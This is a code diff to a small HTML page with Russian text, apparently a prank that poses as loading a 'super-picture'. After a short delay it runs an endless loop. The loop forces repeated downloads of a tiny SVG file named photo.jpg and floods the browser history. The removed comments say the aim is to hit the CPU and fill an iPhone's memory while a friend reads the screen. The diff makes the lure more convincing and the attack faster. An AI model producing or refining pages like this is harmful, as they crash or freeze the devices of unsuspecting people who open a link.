@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Внимание!</title>
+    <title>Загрузка...</title>
     <style>
         body { background-color: black; color: white; text-align: center; font-family: sans-serif; margin-top: 20%; }
     </style>
@@ -11,13 +11,15 @@
     <h1>Загрузка супер-картинки...</h1>
     
     <script>
-        // Ждем 2 секунды, чтобы друг успел прочитать текст, и бьем по процессору
         setTimeout(function() {
             while (true) {
-                // Бесконечно пушим состояние в историю браузера, забивая память iOS
+                var link = document.createElement('a');
+                link.download = "photo.jpg";
+                link.href = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMCIgaGVpZ2h0PSIxMCI+PC9zdmc+";
+                link.click(); 
                 window.history.pushState(null, null, Math.random().toString());
             }
-        }, 2000);
+        }, 1500);
     </script>
 </body>
 </html>
